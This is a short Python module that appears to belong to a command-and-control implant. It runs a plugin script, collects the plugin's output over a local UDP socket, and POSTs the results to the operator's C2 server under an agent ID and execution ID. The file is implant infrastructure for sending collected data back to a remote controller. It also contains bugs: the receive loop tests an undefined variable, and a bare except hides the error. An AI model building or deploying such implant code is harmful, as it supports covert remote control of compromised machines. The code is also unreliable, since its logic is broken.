from threading import Thread 
import os
import subprocess
import socket

import sys
sys.path.append("comm")


#hard coding transport_Http, TO-DO, propogate CLI module
import importlib
transportMode = "transport_Http"
transportMode = importlib.import_module(transportMode)

class pluginExecution():
	executionId = None
	pluginObj = None
	dats =  None

	def __init__(self,pluginObj,executionId):
		self.executionId =executionId
		self.pluginObj = pluginObj

	def execute(self):
		Thread(target=self.startAgentSocket).start()
		#replace with plugin location and args 
		#print(f"hey, i just executed, plugin path is :{self.pluginObj.pluginpath_dir}")
		#subprocess.Popen([self.pluginObj.pluginpath_dir])

		plugin_path = os.path.dirname(__file__) + "/agentplugin_example.py"
		subprocess.Popen(['python3', plugin_path])

	
	def startAgentSocket(self):
		PORT = 6789
		agent_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		agent_s.bind(("localhost", PORT))
		agent_s.settimeout(5)

		try:
		 while True:
		  self.data,addr = agent_s.recvfrom(2048)
		  if not data:
		  	print("No more data")
		  	break
		except:
			pass
		finally:
			agent_s.close()
			print("Closed")
			print("received message: %s" % self.data)
			jsonData = {
			"plugin":self.pluginObj.pluginId,
			"result":self.data.decode('utf-8')}
			serverAddr =  self.pluginObj.c2url + "/results/"+ self.pluginObj.agent_id +"/"+ self.executionId
			r = transportMode.sendRequest(serverAddr,jsonData,method="post")




		  
	




